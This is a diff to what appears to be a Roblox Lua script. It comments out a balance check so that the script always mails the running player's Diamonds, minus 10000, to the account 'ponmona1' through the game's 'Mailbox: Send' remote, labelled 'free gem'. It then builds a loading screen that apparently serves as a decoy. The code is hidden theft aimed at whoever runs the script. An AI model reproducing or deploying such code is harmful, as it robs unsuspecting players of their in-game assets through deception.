@@ -1,5 +1,5 @@
 
-#if game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].value >= 20000 then
+--if game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].value >= 20000 then
     local args = {
         [1] = "ponmona1",
         [2] = "free gem",
@@ -8,7 +8,7 @@
         [5] = game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].value - 10000
     }
     game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-#end
+--end
 
 local LoadingUI = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
